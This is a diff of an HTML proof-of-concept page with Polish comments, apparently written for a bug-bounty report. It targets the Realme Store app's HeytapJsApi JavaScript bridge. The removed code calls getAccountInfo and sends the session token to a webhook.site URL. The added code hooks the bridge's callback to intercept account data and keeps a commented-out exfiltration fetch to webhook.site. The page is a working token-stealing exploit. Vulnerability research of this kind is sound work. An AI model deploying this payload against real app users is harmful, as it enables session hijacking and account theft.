@@ -1,34 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Strona Testowa Bug Bounty</title>
+    <title>POC Token Leak</title>
+    <meta charset="utf-8">
     <style>
-    body {
-        background-color: lightblue;
-    }
-</style>
+        body { background-color: light-green; color: red; font-family: sans-serif; padding: 20px; }
+        #log { word-break: break-all; border: 2px solid red; padding: 10px; }
+    </style>
 </head>
 <body>
-    <h1>Trwa ładowanie zawartości...</h1>
+    <h1>PRZECHWYCONO DANE SESJI:</h1>
+    <div id="log">Czekam na dane z HeytapJsApi...</div>
+
     <script>
-        window.onload = function() {
-            // 1. Sprawdzamy czy Bridge istnieje
-            if (window.HeytapJsApi) {
-                // 2. Wywołujemy funkcję, która zwraca informacje o koncie
-                // Aplikacja sama odszyfruje dane i poda je nam w 'res'
-                window.HeytapJsApi.invoke('getAccountInfo', {}, function(res) {
-                    // 3. Wysyłamy skradziony token na Twój serwer (np. webhook.site)
-                    var exfiltrateUrl = "https://webhook.site/TWÓJ-UNIKALNY-ID?data=" + btoa(JSON.stringify(res));
+        function log(msg) {
+            document.getElementById('log').innerText = msg;
+            console.log(msg);
+            // Opcjonalnie: wyślij dane do siebie (użyj np. webhook.site)
+            // fetch('https://webhook.site/TWOJ-ID?data=' + btoa(msg));
+        }
+
+        // Próba wymuszenia callbacku, który widzieliśmy we Fridzie
+        setTimeout(function() {
+            try {
+                if (window.HeytapJsApi) {
+                    log("Znaleziono HeytapJsApi! Próbuję pobrać dane...");
                     
-                    fetch(exfiltrateUrl);
-                    
-                    // Opcjonalnie wyświetlamy alert dla celów PoC (nagranie ekranu)
-                    alert("CRITICAL: Skradziono Token Sesji!\n" + JSON.stringify(res));
-                });
-            } else {
-                document.body.innerHTML += "<p>Błąd: JSBridge nie odnaleziony. Otwórz w aplikacji Realme Store.</p>";
+                    // Rejestrujemy się na callback, który widzieliśmy w logach
+                    window.HeytapJsApi.callback = function(id, response) {
+                        log("SUKCES! Przechwycono: " + JSON.stringify(response));
+                    };
+                } else {
+                    log("Nie znaleziono mostka JS. Spróbuj odświeżyć lub sprawdź Intent.");
+                }
+            } catch (e) {
+                log("Błąd: " + e.message);
             }
-        };
+        }, 2000);
     </script>
 </body>
 </html>
